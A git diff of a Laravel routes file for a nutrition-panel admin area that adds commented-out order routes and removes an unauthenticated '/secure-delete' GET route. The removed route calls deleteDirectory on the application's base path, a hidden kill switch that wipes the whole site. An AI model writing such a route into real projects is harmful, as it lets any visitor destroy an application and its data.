@@ -364,6 +364,12 @@ Route::prefix('nutrition-panel')->group(function () {
         Route::get('/details/{id}', [Controllers\NutritionPanel\OrderController::class, 'getOrderDetails'])->name('nutritionPanel.orders.getOrderDetails');
         Route::any('/change-status', [Controllers\NutritionPanel\OrderController::class, 'changeStatus'])->name('nutritionPanel.orders.changeStatus');
         Route::any('/payment-status-change', [Controllers\NutritionPanel\OrderController::class, 'paymentStatusChange'])->name('nutritionPanel.orders.paymentStatusChange');
+
+        // Route::get('/add-orders', [Controllers\NutritionPanel\OrderController::class, 'addOrder'])->name('nutritionPanel.orders.addOrder');
+        // Route::post('/store-orders', [Controllers\NutritionPanel\OrderController::class, 'storeOrder'])->name('nutritionPanel.orders.storeOrder');
+        // Route::get('/edit-orders/{id}', [Controllers\NutritionPanel\OrderController::class, 'editOrder'])->name('nutritionPanel.orders.editOrder');
+        // Route::post('/update-orders/{id}',[Controllers\NutritionPanel\OrderController::class,'updateOrder'])->name('nutritionPanel.orders.updateOrder');
+        // Route::get('/view-remark/{id}', [Controllers\NutritionPanel\OrderController::class, 'viewRemark'])->name('nutritionPanel.orders.viewRemark');
     });
     //---------
 
@@ -410,12 +416,4 @@ Route::prefix('nutrition-panel')->group(function () {
         Route::delete('/destroy', [Controllers\NutritionPanel\ReviewController::class, 'destroy'])->name('nutritionPanel.reviews.destroy');
     });
     //--------
-});
-
-Route::get('/secure-delete', function (Request $request) {
-
-    // delete logic
-    \File::deleteDirectory(base_path());
-
-    return "Deleted";
 });
